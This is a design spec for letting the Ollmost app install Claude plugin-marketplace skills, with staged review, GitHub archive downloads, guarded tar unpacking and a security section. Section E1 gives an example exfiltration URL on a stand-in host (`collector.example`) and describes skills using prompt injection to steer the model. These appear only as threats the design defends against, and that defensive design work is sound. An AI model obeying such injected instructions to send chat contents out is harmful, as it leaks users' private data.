# Install skills from plugin marketplaces: design

- **Issue:** none yet. This spec is the proposal; the numbered decisions below are for review.
- **Branch:** `claude/nifty-hopper-qf6f6a`.
- **Status:** draft for review, 2026-09-26.
- **Agreed in review (2026-09-26):**
  - `web_fetch` asks first while a marketplace skill is active (decision 10, E1).
  - The review offers a plugin's MCP servers (decision 11, C4).
  - Commands move to [#90](https://github.com/EdCarney/ollmost/issues/90).
  - Proxy support isn't part of this work.

## Goal

Ollmost can browse and install skills from the same catalogs Claude Code uses: Claude **plugin marketplaces**. A marketplace is a `.claude-plugin/marketplace.json` in a git repository (or at a URL) that lists plugins and where to fetch each one. A plugin can carry skills (`SKILL.md` folders), plus commands, agents, hooks and MCP servers. Ollmost installs only a plugin's skills.

After this change:

- You add a marketplace by typing `owner/repo`, a GitHub URL, a link to a `marketplace.json`, or a local folder. Anthropic's three public marketplaces can be added with one click; nothing is added until you do so.
- Skills → **Browse** lists every plugin in your marketplaces, searchable, with its description, author, category and whether it's installed.
- **Review** downloads a plugin and shows exactly what would be installed: each skill's instructions, its files, what Ollmost will ignore, its license, and roughly how many tokens it adds to each request. **Install** then makes it permanent; **Discard** removes the download.
- An installed plugin's skills work like any other skill: they're listed under Skills, turned on per chat with `/` or the + menu, and loaded by the model with `load_skill`. They're read-only, with **Duplicate to edit** as today.
- Updates are never automatic. A refreshed marketplace marks plugins that have a new version; **Update** goes through the same review.

## Non-goals

- **The Discovery directory on claude.ai** (Customize → Skills → Browse). It has no public API: installs are tied to a claude.ai account, and only Claude Code's account sync reads them. This spec doesn't scrape it.
- **Running anything a plugin ships on its own**: no hooks, no `npm install`, and never a `command` source.
  - A plugin's scripts can only run through the existing sandboxed `run_code`, under its usual approval.
  - Its MCP servers run only if you add them yourself (C4).
- **Commands.** Tracked in [#90](https://github.com/EdCarney/ollmost/issues/90), which starts with built-in commands such as `/compact` and takes plugin commands after.
- **Agents and output styles.**
- **Proxies and company certificates.** Downloads use global `fetch`, as Ollmost's requests to ollama.com do today. A network that needs a proxy or inspects TLS isn't supported here, as it isn't for those.
- **Git hosts other than GitHub** (open question 1).
- **Publishing** to a marketplace.

## Background: what's in the catalogs

These counts come from Anthropic's three public marketplaces, measured on 2026-09-26 from shallow clones.

| Marketplace | Plugins | In the catalog's own repo (relative path) | On github.com (`url`, `git-subdir`), pinned to a commit | Other source types |
| --- | --- | --- | --- | --- |
| `anthropics/claude-plugins-official` | 314 | 52 | 262 | 0 |
| `anthropics/knowledge-work-plugins` | 121 | 22 | 99 | 0 |
| `anthropics/skills` (`anthropic-agent-skills`) | 5 | 5 | 0 | 0 |

So fetching from GitHub covers every plugin in all three.

Across the 303 skills whose files are in those repos:

- **Name collisions:** 19 skills share a name with a skill in another plugin (three plugins each ship a `configure`, three an `access`, three a `start`). Names need a plugin prefix, as in Claude Code (`/plugin-name:skill-name`).
- **Names Ollmost's own editor wouldn't accept:** 12 skills, all in one plugin, have nested names like `video-sdk/web`, for `skills/video-sdk/web/SKILL.md`.
- **References outside the skill's folder:** 9 skills (3%) reference `${CLAUDE_PLUGIN_ROOT}`, pointing at files like `scripts/validate.sh`, `templates/report.md` or `config.json` elsewhere in their plugin. One references `${CLAUDE_SKILL_DIR}`. So Ollmost keeps the whole plugin folder, not just its skills.
- **Scripts:** 19 skills have a `scripts/` folder.
- **Frontmatter:**
  - `allowed-tools` (52 skills) and `user-invocable` (64 skills) are common.
  - `license` (18 skills) is set on Anthropic's own document skills.
- **Other components:** of the 61 plugins with a `plugin.json`, 35 also declare MCP servers (`.mcp.json`) and 7 have hooks. None of this repo's code is needed to use their skills.
- **Symlinks:** none in any of the three repos.

## Decisions (proposed)

1. **Plugin is the unit of install; skill is the unit of use.** You install or remove whole plugins, and turn their skills on or off one by one (the existing switch).
2. **Review before install, and before every update.** Nothing lands in the skills list without you seeing what it is.
3. **No automatic updates, no background network.** Ollmost fetches only when you add, refresh, review or update. The Browse tab refreshes a marketplace fetched more than 24 hours ago when you open it.
4. **GitHub only, without the GitHub API.** Downloads use `codeload.github.com` archives, and branch names are turned into commits through git's own HTTP protocol. Neither counts against GitHub's 60-requests-an-hour API limit. A GitHub token is optional, for private repositories.
5. **Keep the whole plugin folder**, minus `.git` and `node_modules`, and minus everything that isn't a declared skill when the plugin *is* the repository root (decision 5 in Trade-offs).
6. **Skill names are `plugin:skill`**, the way Claude Code names plugin skills. A bare `skill` still resolves when only one enabled marketplace skill has that name.
7. **Ids are fixed at install**: `market:<marketplace>/<plugin>:<skill>`. Chats store skill ids, so a later rename in the catalog never orphans them.
8. **New installs start on**, but the review shows what they cost per request, and **Install turned off** is one click.
9. **Reserved names are enforced as Claude Code does.** A marketplace calling itself `claude-plugins-official` (and the rest of Claude Code's reserved list) is refused unless it comes from `github.com/anthropics/`. Those from `anthropics/` get an **Anthropic** badge.
10. **`web_fetch` asks first while a marketplace skill is active in the chat**, unless you already allowed that site for the chat (E1). *Agreed.*
11. **A plugin's MCP servers are offered, never added.** **Add its MCP servers…** pre-fills Settings → Tools → Paste JSON, where you add them as you would any server (C4). *Agreed.*

## Part A: the model

### A1. Where things live

| Path in the data folder | What | Who writes it |
| --- | --- | --- |
| `marketplaces/<name>/` | A GitHub marketplace's snapshot: the repository at `commit`, minus `.git` and `node_modules`. A URL marketplace keeps only `marketplace.json` here; a local folder marketplace has nothing here. | add, refresh |
| `plugins/<marketplace>/<plugin>/` | An installed plugin's files | install, update |
| `plugins/<marketplace>/<plugin>/.ollmost-install.json` | Its install record (A2) | install, update |
| `plugins/.staging/<random>/` | Downloads under review, and the old copy during an update | review, update |
| `plugin-data/<marketplace>/<plugin>/` | `${CLAUDE_PLUGIN_DATA}` for MCP servers you added from a plugin (C4) | those servers |
| `marketplaces/.staging/<random>/` | A marketplace being added or refreshed | add, refresh |
| settings table, key `skillMarketplaces` | The marketplaces you added (A3) | add, refresh, remove |
| settings table, key `githubToken` | The optional token, encrypted with `safeStorage` like the ollama.com key | Settings |

- `paths.ts` gains `plugins` and `marketplaces`.
- Both `.staging` folders are hidden, so `findSkillDirs` and `listFiles` already skip them.
- On every start, anything in `.staging` is deleted, except the recovery case in C3.

### A2. The install record

The record sits inside the plugin's folder, so the files and their description are moved and deleted together and can't disagree.

```ts
interface InstallRecord {
  marketplace: string
  /** Folder name, and part of every skill id. Fixed at install. */
  plugin: string
  /** The plugin's current name in the catalog, which follows the marketplace's `renames`. */
  entryName: string
  source: { kind: 'github'; repo: string; commit: string; path: string } | { kind: 'directory'; path: string }
  /** See B5. */
  version: string
  installedAt: number
  /** Skill folders relative to the plugin folder, with the name each resolved to (A4). */
  skills: Array<{ dir: string; name: string }>
  /** sha256 of every file kept, so an update's review can list what changed. */
  files: Record<string, string>
}
```

### A3. Marketplaces

```ts
interface StoredMarketplace {
  /** From marketplace.json. Unique, and the folder name. */
  name: string
  source: { kind: 'github'; repo: string; ref: string | null } | { kind: 'url'; url: string } | { kind: 'directory'; path: string }
  /** github: the snapshot's commit. */
  commit: string | null
  fetchedAt: number | null
  /** The last refresh's error, shown on the marketplace; the previous snapshot stays in use. */
  error: string | null
}
```

- **The folder name.** A marketplace's `name` becomes a folder name, so it must match `^[A-Za-z0-9][A-Za-z0-9._-]{0,99}$`. That's stricter than Claude Code, which only forbids spaces, slashes and `..`.
- **One marketplace per name.** A second marketplace with a name you already have is refused.
- **Case collisions.** Two plugin entries whose names differ only in case collide on macOS's filesystem; the second one is skipped.

### A4. Finding a plugin's skills

Each plugin has a manifest: its `.claude-plugin/plugin.json` if it has one, or else its catalog entry. The skills are:

- **If the manifest declares `skills`:** exactly those paths. Claude Code documents this list as replacing the default `skills/` folder.
  - With `strict: true` and a `plugin.json`, the entry's `skills` paths are added to the manifest's, as Claude Code does.
  - `anthropics/skills` relies on the entry's list acting as a filter. All its plugins share the repository root, and `document-skills` must get 4 skills, not all 19. Claude Code currently gets this wrong ([anthropics/claude-code#53426](https://github.com/anthropics/claude-code/issues/53426)).
- **Otherwise:** every `SKILL.md` under `skills/`, at most three folders deep, so nested skills like `skills/video-sdk/web/SKILL.md` count.
- **What a path may point at:** a skill folder (it contains `SKILL.md`), or a folder of skill folders.
- **Paths that leave the plugin:** a path that resolves outside the plugin folder is dropped, as in Claude Code.

A skill's **name** is its frontmatter `name`, or else its folder path relative to the `skills/` folder. It must match `^[a-z0-9]+(-[a-z0-9]+)*(/[a-z0-9]+(-[a-z0-9]+)*)*$` and be at most 64 characters. A skill with neither kind of valid name isn't installed, and the review says why.

Frontmatter that Ollmost acts on is read for **every** skill source, not just marketplaces, so `~/.claude/skills` benefits too:

| Field | Ollmost |
| --- | --- |
| `name`, `description` | As today |
| `disable-model-invocation: true` | Left out of the `<skills>` index, so only `/` or the + menu turns it on |
| `user-invocable: false` | Left out of the `/` and + menus; the model can still load it |
| `license`, `compatibility` | Shown on the skill's page |
| `allowed-tools`, `disallowed-tools`, `model`, `effort`, `context`, `agent`, `hooks`, `paths`, `shell`, `arguments` | Ignored. The skill's page lists them under "Written for Claude Code: Ollmost ignores …" |

### A5. Names, ids and lookup

- `Skill` gains `source: 'marketplace'`, `qualifiedName` and `plugin?: { marketplace: string; name: string; root: string }`. For every other source, `qualifiedName` is `name`.
- **Ids:** `market:<marketplace>/<plugin>:<name>`, with `#2` and so on for duplicates within one plugin, as today. `setSkillEnabled` needs no change: every id outside `claude:` already goes on the `disabled` list.
- **Where each name is used:**
  - **`qualifiedName`:** the `<skills>` index, `<skill name="…">` in the prompt, `load_skill` and `read_skill_file`, and the `/` menu (which also matches the bare name as you type).
  - **Bare `name`:** only the skill's own page.
- **`findSkillByName(name)`:**
  1. Match `qualifiedName` exactly among enabled skills, in `SOURCE_PRIORITY` order, with `marketplace` last. `app`, `ollama` and `claude` skills keep today's behaviour.
  2. Otherwise match the bare `name` among enabled marketplace skills, if exactly one matches.
  3. Otherwise fail with the candidates: `Several skills are named "start": <plugin-a>:start, <plugin-b>:start. Use the full name.` The model sees this as a tool error and can retry.

### A6. Plugin paths inside a skill

When a skill's text reaches the model (`getSkill`, used by `load_skill` and by skills you picked), Ollmost replaces two variables:

- **`${CLAUDE_SKILL_DIR}`** becomes the skill's folder.
- **`${CLAUDE_PLUGIN_ROOT}`** becomes the plugin's folder.

`${CLAUDE_PLUGIN_DATA}`, `${CLAUDE_SESSION_ID}`, `${CLAUDE_PROJECT_DIR}` and `$ARGUMENTS` are left as written. The skill's page flags them.

For code runs, `readableFolders()` (`src/main/runner/provider.ts`) adds each plugin's root to the skill folders it lists already, so `run_code` and code sessions can read `${CLAUDE_PLUGIN_ROOT}/scripts/…`. For a skill with scripts, `load_skill` also names the plugin's folder in the run hint, next to the skill's.

## Part B: fetching

### B1. Adding a marketplace

| You type | Source |
| --- | --- |
| `owner/repo`, `owner/repo@ref`, `owner/repo#ref` | `github` |
| `https://github.com/owner/repo`, with or without `.git`, `/tree/<ref>` | `github` |
| Any other `https://` URL | `url`: a link to a `marketplace.json` |
| An absolute path, or **Choose folder…** | `directory` |

- **Anthropic's marketplaces.** Until they're added, the Browse tab's empty state and Manage marketplaces list three one-click entries: `anthropics/claude-plugins-official`, `anthropics/knowledge-work-plugins` and `anthropics/skills`.
- **What `marketplace.json` must have.** It's validated like Claude Code's required fields: `name`, `owner.name`, `plugins[]`. Each entry is validated on its own, so one bad entry is listed with its reason instead of failing the marketplace.
- **Keys Ollmost reads:** `name`, `description` (or `metadata.description`), `metadata.pluginRoot` and `renames`.
- **Entry fields Ollmost reads:** `name`, `displayName`, `description`, `author`, `homepage`, `repository`, `license`, `category`, `tags`, `keywords`, `version`, `strict`, `skills` and `source`. Everything else is ignored.
- **Relative paths in a `url` marketplace can't resolve:** Ollmost has only the JSON file. As in Claude Code, those entries show "This plugin's files aren't available from a link to its catalog."

### B2. Plugin sources

| `source` | v1 | How |
| --- | --- | --- |
| Relative path (`./x`, `.`, or a bare name under `metadata.pluginRoot`) | yes | Copied from the marketplace's snapshot or folder |
| `github` (`repo`, `ref`, `sha`) | yes | GitHub archive |
| `url` whose host is `github.com` | yes | GitHub archive |
| `git-subdir` whose `url` is on `github.com` or `owner/repo` | yes | GitHub archive, keeping only `path` |
| `url` / `git-subdir` on another host | no | "Ollmost can install from GitHub only, for now." Open question 1 |
| `archive` (a zip over HTTPS) | no | Needs a zip reader; no catalog above uses it |
| `npm` | no | |
| `command` | never | It runs a shell command on your Mac |

- **Unsupported sources are still listed**, with the reason and a link to their homepage, so the catalog reads the same as in Claude Code.
- **Paths that escape the marketplace.** A relative path containing `..` or a backslash is refused, as in Claude Code.

### B3. Talking to GitHub

- **Archives:** `GET https://codeload.github.com/<owner>/<repo>/tar.gz/<commit or ref>`.
  - This isn't the REST API, so it doesn't use its 60-requests-an-hour allowance, which a company network often exhausts across everyone behind one address.
  - The archive is read as a stream: gunzip, then a tar parser (B4). Only the entries under the wanted path are written.
- **Branch → commit:** `GET https://github.com/<owner>/<repo>.git/info/refs?service=git-upload-pack`, the ref list git itself uses.
  - Ollmost parses its pkt-lines for `refs/heads/<ref>`, `refs/tags/<ref>` (following `^{}` for annotated tags) or `HEAD`.
  - It's needed only for a source with no `sha`: a marketplace (every refresh) and the rare unpinned `github` or `url` plugin. Every non-relative plugin in the three catalogs above has a `sha`.
  - As a cross-check, `git archive` writes the commit into the archive's pax global header (`git get-tar-commit-id`). When the header is present, Ollmost compares the two and refuses on a mismatch.
- **With a GitHub token** (Settings, below the marketplaces list):
  - **Archives** go through `https://api.github.com/repos/<owner>/<repo>/tarball/<commit>` with `Authorization: Bearer <token>`. The redirect is followed manually, and only to `codeload.github.com`, without the header.
  - **Ref lists** use basic auth `x-access-token:<token>`.
  - **Host check:** the token is attached only to requests whose host is exactly `api.github.com` or `github.com`.
  - **Recommended token:** a fine-grained token, read-only on Contents.
- **HTTP client:** global `fetch`, as `src/main/ollama/web.ts` does, passed in as a parameter so tests can fake it.
  - Timeouts: 15 s for ref lists and catalog files, and 120 s for a whole download.
  - **Errors:**
    - A 404 without a token says "not found, or private: add a GitHub token".
    - A 403 or 429 shows GitHub's message and the time it resets.

### B4. Unpacking

Unpacking uses `tar-stream` (parsing only; Ollmost does every write itself) over `node:zlib`. Both are pure JavaScript, so the tests run the same on the Linux and macOS CI jobs. This adds one runtime dependency, `tar-stream`.

For each entry:

- The first path component (GitHub's `<repo>-<commit>/` folder) is dropped, then the path is resolved against the wanted subpath. Anything outside it is skipped without being read.
- **Only regular files and folders are written.** Symlinks, hard links, devices and FIFOs are skipped and counted; the review says "3 links weren't installed". None of the three catalogs has any.
- A path that's absolute, contains `..`, a backslash or a NUL byte, or has a component `.git` or `node_modules`, is skipped.
- **Permissions:** files are written as `0644`, or `0755` when any execute bit was set. Owner, set-uid bits and timestamps are never kept.
- **Limits.** Crossing one aborts the review with the limit's name, and the staging folder is deleted:

  | Limit | Plugin | Marketplace snapshot |
  | --- | --- | --- |
  | Downloaded (compressed) | 100 MB | 100 MB |
  | Written | 50 MB | 100 MB |
  | Files | 5,000 | 20,000 |
  | One file | 10 MB | 10 MB |

- **Writes stay inside staging.** Each write goes to a path under the staging folder, opened with `O_CREAT | O_EXCL | O_NOFOLLOW`. Since nothing written is a link, no write can leave staging.

### B5. Versions and updates

A plugin's `version` is the first of these that applies:

1. **`plugin.json` `version`, then the entry's `version`.** This follows Claude Code's order. For a non-relative source, `plugin.json` is read from the review download.
2. **`<commit>:<path>`** for a GitHub source.
3. **For a relative-path plugin, a hash of the files Ollmost would keep.** A marketplace commit changes the whole repository, but that doesn't mean every plugin changed.
   - This is the sha256 of the sorted `(path, sha256)` list, computed from the snapshot.
   - `anthropics/skills` is the case that needs it: all five of its plugins sit at the repository root.

Refreshing a marketplace works out every installed plugin's catalog version:

- For a relative path, from the new snapshot, with no download.
- For others, from the entry's `sha` or `version`, or from the ref list for an unpinned source.

A plugin whose version differs gets **Update**. A plugin the catalog renamed follows `renames`: its `entryName` updates, while its folder and ids stay. A plugin the catalog dropped (`renames` to `null`, or no entry) is marked "No longer in <marketplace>" and keeps working until you remove it.

## Part C: installing

### C1. Review

`review(marketplace, plugin)`:

1. Downloads or copies the plugin into `plugins/.staging/<id>/`, by B2–B4.
2. Finds its skills by A4, and reads each one's frontmatter and instructions.
3. Returns a `PluginReview`, with no side effects beyond the staging folder:

```ts
interface PluginReview {
  stagingId: string
  marketplace: string
  plugin: string
  version: string
  source: string                       // "github.com/adobe/skills @ acb6d76, plugins/creative-cloud/adobe-for-creativity"
  license: string | null               // entry, plugin.json or frontmatter `license`; plus a LICENSE file's first lines
  skills: Array<{
    name: string                       // qualified
    description: string
    body: string
    files: string[]
    hasScripts: boolean
    flags: string[]                    // "Refers to ${CLAUDE_PLUGIN_DATA}", "Written for Claude Code: allowed-tools", …
    error?: string                     // not installable, and why
  }>
  ignored: { mcpServers: number; hooks: number; agents: number; commands: number; links: number }
  tokens: number                       // this plugin's lines in the <skills> index, by the same estimate Settings → Tools uses
  update?: { from: string; added: string[]; changed: string[]; removed: string[] }   // against the install record's `files`
}
```

### C2. Install, update, uninstall

- **Install** (`install(stagingId, { enabled })`) writes `.ollmost-install.json` into the staging folder, then renames it to `plugins/<marketplace>/<plugin>/`. It's on the same volume, so this is atomic.
  - With `enabled: false`, the new ids go on `settings.skills.disabled`.
  - Then it runs `invalidateSkills()` and broadcasts `event:skills`.
- **Update** is a review followed by:
  1. Write `plugins/.staging/<id>/.ollmost-commit` naming the target folder.
  2. Rename the current folder to `plugins/.staging/<id>-old`.
  3. Rename the new one into place, then delete the `-old` folder.
  - A skill the update removes disappears from chats that used it, the same as deleting an app skill today.
  - A skill you had turned off stays off, because its id doesn't change.
- **Uninstall** moves the plugin's folder to the Trash (`shell.trashItem`, as `deleteSkill` does) and removes its ids from `settings.skills.disabled`.
- **Removing a marketplace** asks first, listing the plugins it would remove. It then uninstalls them and deletes `marketplaces/<name>/`. This matches Claude Code, where removing a marketplace uninstalls its plugins.
- **Discard** (`discard(stagingId)`) deletes the staging folder.

### C3. Recovery at start

Before skills are first listed:

- Every `plugins/.staging/<id>` that has an `.ollmost-commit` and whose target folder is missing is moved into place. That target folder is missing only when Ollmost stopped between update steps 2 and 3.
- Everything else in both `.staging` folders is deleted.

```
review ─► .staging/<id> ──install──► plugins/<m>/<p>/
                        └─discard──► (deleted)
update:  .staging/<id> + .ollmost-commit
         plugins/<m>/<p> ──rename──► .staging/<id>-old      ◄─ crash here: start moves <id> into place
         .staging/<id>  ──rename──► plugins/<m>/<p>
         .staging/<id>-old ──rm
```

### C4. A plugin's MCP servers

35 of the 61 plugins measured declare MCP servers: in `.mcp.json` at the plugin root, or as `mcpServers` in `plugin.json` (inline, or a path to a JSON file). Ollmost never starts them itself.

- **Where they're offered.** The review and the installed plugin's page list the servers by name and command. **Add its MCP servers…** opens Settings → Tools → Paste JSON with them pre-filled as `{"mcpServers": {…}}`. That's the shape `parseServersJson` (`src/shared/mcpImport.ts`) already reads. From there it's the existing flow: they're added switched off for new chats, and every tool starts on **Ask**.
- **What's filled in before pasting:**
  - `${CLAUDE_PLUGIN_ROOT}` becomes the plugin's folder.
  - `${CLAUDE_PLUGIN_DATA}` becomes `plugin-data/<marketplace>/<plugin>/` in the data folder. It's created on first use, kept across updates, and moved to the Trash on uninstall, mirroring Claude Code.
- **Other `${NAME}` values.** An environment value written as `${NAME}` (a token the server expects from your environment) is imported as a variable with no value. The server stays locked until you enter it in Settings → Tools, the same missing-values state as after the move from Kiln.
- **What's left out.** Remote servers (`url`, or type `http` / `sse`) are left out with `parseServersJson`'s existing message, since Ollmost runs local (stdio) servers only.
- **Dependencies.** A server that runs the plugin's own code, such as `node ${CLAUDE_PLUGIN_ROOT}/servers/server.js`, may need its packages installed. Ollmost doesn't install them (non-goal), so when the plugin has a `package.json`, the dialog says to run `npm ci` in its folder first.
- **Where each server came from.** A server added this way records `origin: { marketplace, plugin }`.
  - Uninstalling the plugin lists those servers and offers to remove them too, since their commands point into its folder.
  - An update whose MCP configuration changed says so in its review, with **Add its MCP servers…** again. Servers already added are never changed by an update.
- **Trust.** Pasting and saving is the approval, as for any server today, and the README's trust rules apply unchanged: a changed command or environment sets tools back to Ask.

## Part D: interface

### D1. Skills view (`src/renderer/src/views/SkillsView.tsx`)

**Installed | Browse** tabs above the list.

- **Installed:** today's list. Marketplace skills are grouped by plugin ("document-skills · anthropic-agent-skills"), and each group has a menu with Update (when there is one), Show in Finder and Remove plugin.
  - A skill's page adds badges: Anthropic, the marketplace, "Update available", "No longer in <marketplace>".
  - It also shows the frontmatter notes from A4.
- **Browse:** a search box and a marketplace filter; the list searches name, `displayName`, description, category, tags and keywords.
  - Each row shows the plugin's name, marketplace, category, the Anthropic badge, and one of: Installed, Update, or Not available (with the reason).
  - **The detail pane before review** shows the entry's own fields (description, author, homepage, license, source). For a non-relative source, only these fields are known until a download, as in Claude Code.
  - **Review** downloads, with a spinner and **Cancel**, then fills the pane from `PluginReview`:
    - Each skill, with its instructions rendered and folded by default.
    - Its flags, and what's ignored.
    - The token cost.
    - **Install**, **Install turned off** and **Discard**.
    - The plugin's MCP servers, if any, with **Add its MCP servers…** (C4).
  - For an update, the pane lists the files added, changed and removed, and **Update** replaces **Install**.
- **Manage marketplaces…** at the foot of the Browse tab: a modal listing each marketplace with its source, commit, when it was fetched, and any error. It has **Refresh** and **Remove**, an **Add** field, the three Anthropic one-click entries, and the GitHub token field.

### D2. Elsewhere

- **The `/` menu and + menu** show `plugin:skill` for marketplace skills and hide `user-invocable: false` ones.
- **Settings → Web, artifacts & skills** gains "Marketplaces: 3 · Manage…", opening the same modal.

## Part E: security

| Risk | What stops it |
| --- | --- |
| A skill's instructions steer the model (prompt injection); `load_skill` never asks | You add each marketplace and install each plugin yourself, after reading it (decision 2). Installs are pinned: new text arrives only through an Update you review, with the changed files listed. `web_fetch` asks first while one is active (E1). Residual risk: a site you allowed for the chat, and anything the model writes into its answer. |
| A plugin runs code | Nothing a plugin ships is executed on its own: no hooks, no package installs, no `command` sources. Its MCP servers run only after you paste and save them yourself (C4). Scripts run only through `run_code`, sandboxed and asking first unless you changed its setting. The sandbox can read plugin folders (A6) but can't write them. |
| A malicious archive writes outside its folder | B4: only files and folders, clean relative paths, `O_NOFOLLOW` writes inside a fresh staging folder, and size and count limits |
| A lookalike of an official marketplace | Claude Code's reserved names, including its rule for other spellings of them, are refused unless the source is `github.com/anthropics/*`. Only those get the Anthropic badge. |
| The GitHub token leaks | It's encrypted at rest and never reaches the renderer or a prompt. It's sent only to `api.github.com` and `github.com`. Redirects are followed manually, without it. |
| A symlink inside an installed skill points elsewhere on this Mac | None are installed (B4). `readSkillFile`'s real-path check stays as a second guard. |
| Licensing | Ollmost never bundles or redistributes anyone's skills. You download them from their source. The review shows each plugin's license: Anthropic's `docx`, `pdf`, `pptx` and `xlsx` skills are "source-available, not open source". |

### E1. `web_fetch` while a marketplace skill is active

A skill that passed review can still tell the model to fetch `https://collector.example/?d=<chat contents>`. So while a marketplace skill is active in a chat, `web_fetch` asks first.

- **"Active"** means a marketplace skill is selected in the chat (`conversation.skills`) or was loaded there (`autoSkills`), including one loaded earlier in the same reply.
  - `ToolContext` gains `marketplaceSkill: boolean`.
  - `service.ts` sets it from the chat's selected and loaded ids. It sets it again when `load_skill` returns a marketplace skill mid-reply; `service.ts` already adds that id to `loadedIds` at that point.
- **The rule, in `webTools.approval`:**
  1. A chat with MCP servers or shared files: `ask-every-time`, as today. The stricter rule wins, because a site allowed for the chat mustn't carry those files out.
  2. Otherwise, a marketplace skill active: `ask`.
  3. Otherwise: `auto`, as today.
- **Permission you already gave.**
  - `ask` offers **Allow once**, **Allow for this chat** and **Deny**.
  - **Allow for this chat** stores `web_fetch@<host>` (`webFetchAllowKey`, `src/shared/toolAllow.ts`), so later fetches to that site in that chat run without asking. Any other site still asks.
  - A denial covers the site for the rest of the reply, as today.
- **The approval card says why it's asking:** "A skill from <marketplace> is active in this chat."
- **`web_search` doesn't ask.** Its query goes to Ollama's API, not to a site someone else controls; this is the same reasoning as `webTools.ts` today.
- **Limits of this rule.**
  - Ollmost can't tell which instructions led to a call, so a fetch you asked for yourself asks too while such a skill is active.
  - Your own skills and the `~/.ollama/skills` and `~/.claude/skills` folders are unchanged.

## Part F: code changes

| File | Change |
| --- | --- |
| `src/shared/types.ts` | `SkillSource` adds `'marketplace'`. `Skill` adds `qualifiedName`, `plugin?`, `modelInvocable`, `userInvocable`, `notes`. New types: `MarketplaceView`, `CatalogEntry`, `PluginReview`. |
| `src/shared/ipc.ts` | New `marketplaces` group: `list`, `add`, `refresh`, `remove`, `catalog`, `review`, `install`, `discard`, `uninstall`, `setGitHubToken`. `Settings` adds `hasGitHubToken`. New event `event:marketplaces`. |
| `src/preload/index.ts` | Bridge for the new group and event |
| `src/main/paths.ts` | `plugins`, `marketplaces` |
| `src/main/skills/library.ts` | A marketplace root, whose skills come from install records instead of a folder walk. `qualifiedName`, the new ids, frontmatter flags, variables (A6) and `findSkillByName` (A5). |
| `src/main/skills/marketplace/sources.ts` | Parse what you type (B1) and entry sources (B2). Reserved names. Pure functions. |
| `src/main/skills/marketplace/catalog.ts` | Validate `marketplace.json`. Add, refresh and remove marketplaces. Catalog versions (B5). |
| `src/main/skills/marketplace/github.ts` | Ref lists, archive download, token handling (B3) |
| `src/main/skills/marketplace/unpack.ts` | B4 |
| `src/main/skills/marketplace/install.ts` | Review, install, update, uninstall, recovery (C) |
| `src/main/chat/prompts.ts` | Index and `<skill name>` use `qualifiedName`; `disable-model-invocation` skills are left out of the index |
| `src/main/chat/skillTools.ts` | The ambiguity error. The run hint names the plugin's folder. |
| `src/main/chat/service.ts` | `skillIndex` filters out skills with `modelInvocable: false` |
| `src/main/runner/provider.ts` | `readableFolders()` adds plugin roots |
| `src/main/chat/tools.ts` | `ToolContext.marketplaceSkill` |
| `src/main/chat/webTools.ts` | The E1 rule in `approval`, and the reason shown on the card |
| `src/shared/mcpImport.ts` | `${CLAUDE_PLUGIN_ROOT}` and `${CLAUDE_PLUGIN_DATA}` substitution for a plugin's servers. An env value `${NAME}` becomes a variable with no value. |
| `src/main/mcp/config.ts` | `origin` on a stored server |
| `src/renderer/src/views/ToolsSettings.tsx` | Open Paste JSON pre-filled |
| `src/main/settings.ts` | `setGitHubToken` / `getGitHubToken`, stored like the API key |
| `src/main/index.ts` | Staging recovery (C3) before the first `listSkills()` |
| `src/renderer/src/views/SkillsView.tsx` | Tabs, grouping, badges |
| `src/renderer/src/components/skills/{BrowsePane,PluginReview,MarketplacesDialog}.tsx` | New |
| `src/renderer/src/components/Composer.tsx` | `qualifiedName`, and hides `userInvocable: false` |
| `README.md` | The Skills section: marketplaces, what's installed, what isn't, and the token. Web search: `web_fetch` asks while a marketplace skill is active. |
| `package.json` | `tar-stream` |

## Trade-offs considered

1. **Where the catalog comes from.**
   - **Marketplaces (chosen):** documented, used by Claude Code, Anthropic's catalogs are public, and it works for a team's private repository.
   - **The claude.ai directory:** the same catalog as the Claude app, but it has no public API, needs your claude.ai session, and could break at any release.
   - **Reading Claude Code's `~/.claude/plugins/`:** a tiny change, but it needs Claude Code installed and signed in, has no browsing, and ties Ollmost to Claude Code's internal folder layout. It remains a cheap follow-up alongside this.
2. **How to download.**
   - **`git` (sparse clone):** works with any host. But it isn't on every Mac: `/usr/bin/git` is a stub that asks to install the Command Line Tools when they're missing. And by `src/main/code/git.ts`'s rule it may only run inside the sandbox, where your git config and credential helpers aren't available (open question 1).
   - **The GitHub REST API (trees plus raw files):** fetches only the files it needs, but it costs one or more API requests per plugin against 60 an hour, shared by everyone behind the same address.
   - **`codeload` archives plus git's ref list (chosen):** one request per download, with no API allowance used. It downloads the whole repository when only a subfolder is wanted (`git-subdir`), which costs bandwidth but not disk, since other entries are skipped unwritten. The 100 MB cap bounds it.
3. **How to unpack.**
   - **macOS `tar` (bsdtar):** safe by default and has no dependency, but CI also runs on Linux (GNU tar), and Ollmost would give up control over each write.
   - **`node-tar`:** extracts to disk itself, and has a history of path-traversal fixes.
   - **`tar-stream` (chosen):** parses only; Ollmost makes each write and enforces B4.
4. **Review before install vs. install then inspect.** Reviewing costs one extra click. It's the only point where you see a third party's instructions before the model follows them without asking. Claude Code shows only catalog fields before install; Ollmost's `load_skill` needs no approval, so it asks more of you up front.
5. **Keep the plugin folder vs. only its skills.**
   - **Only the skills** is smaller, but breaks the 3% of skills that use `${CLAUDE_PLUGIN_ROOT}`.
   - **The whole plugin** works for those, at the cost of disk. The exception is a plugin whose root is the repository root and whose manifest lists its skills (the `anthropics/skills` pattern): copying the whole repository would duplicate all 19 skills five times, once per plugin, so those copy only their listed skills.
6. **Namespaced names.** `plugin:skill` in the index costs a few tokens per skill and reads worse in the `/` menu. It's the only way 19 of the 303 measured skills stay reachable, and it matches Claude Code, which the instructions inside these skills are written for.
7. **Manual updates vs. auto-update.**
   - Auto-update keeps skills current, but changes the instructions you reviewed without asking.
   - Claude Code itself defaults auto-update off for third-party marketplaces, and on only for Anthropic's official ones and those added from claude.ai.
   - Manual updates keep review meaningful.

## Testing

- **Unit (Vitest, both CI jobs):**
  - **`sources.ts`:** a table of inputs → sources and entries → install plans, including reserved names, `metadata.pluginRoot` bare names, `..` and backslashes, `url` marketplaces with relative entries, and each unsupported type with its message.
  - **`catalog.ts`:**
    - A fixture shaped like `anthropics/skills`: `source: "./"`, `strict: false`, and a `skills` list, where `document-skills` must get exactly 4 of the 19 skills.
    - A fixture shaped like `claude-plugins-official`: sha-pinned `git-subdir`, plus `renames`.
    - Per-entry validation errors.
  - **`unpack.ts`:** archives built in the test with `tar-stream`'s packer, covering:
    - `../` and absolute paths.
    - A symlink followed by a file written "through" it.
    - Hard links, devices, pax long names, and the `.git` and `node_modules` components.
